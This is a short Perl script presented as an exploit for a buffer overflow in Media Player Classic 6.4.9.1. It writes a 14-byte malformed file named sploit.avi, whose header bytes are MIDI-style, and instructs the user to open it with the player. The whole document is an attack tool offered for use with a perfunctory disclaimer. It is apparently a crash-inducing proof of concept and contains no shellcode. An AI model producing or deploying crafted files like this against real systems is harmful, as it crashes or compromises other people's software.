#!/usr/bin/perl

# Media Player Classic 6.4.9.1 (.avi) Buffer Overflow Exploit
# Homepage: http://www.sourceforge.net/projects/guliverkli2/
# Exploit Coded by: cr4wl3r <cr4wl3r\x40linuxmail\x2Eorg>
# From: Indonesia
#
#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
# WARNING - WARNING - WARNING - WARNING
#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
#
#
#
# Disclaimer: The author published the information under the condition
#             that is not in the intention of the reader to use them in order to bring
#             to himself or others a profit or to bring to others damage.
#
#
# Gr33tz: No Thanks



print "
[+]--------------------------------------------------------------[+]
[+] Media Player Classic 6.4.9.1 (.avi) Buffer Overflow Exploit  [+]
[+] By : cr4wl3r                                                 [+]
[+]--------------------------------------------------------------[+]
";


$buff = "\x4D\x54\x68\x64\x00\x00\x00\x06\x00\x00\x00\x00\x00\x00";

open(file, "> sploit.avi");
print (file $buff);
print "\n\n[+] Done!\n
[+] Open with Media Player Classic\n
[+] Coded by cr4wl3r\n";